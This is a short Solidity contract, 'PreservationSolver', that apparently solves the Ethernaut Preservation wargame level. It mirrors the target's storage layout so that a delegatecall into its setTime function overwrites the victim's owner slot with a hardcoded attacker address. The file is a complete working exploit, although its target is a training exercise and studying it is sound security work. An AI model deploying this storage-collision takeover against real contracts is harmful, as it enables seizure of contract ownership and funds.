/**
 *Submitted for verification at Etherscan.io on 2022-10-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationSolver {
  address constant user = 0xF851CE56Caec96c0DFF74173aFC15966a0070B8C;
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _time) public {
    _time;
    owner = user;
  }
}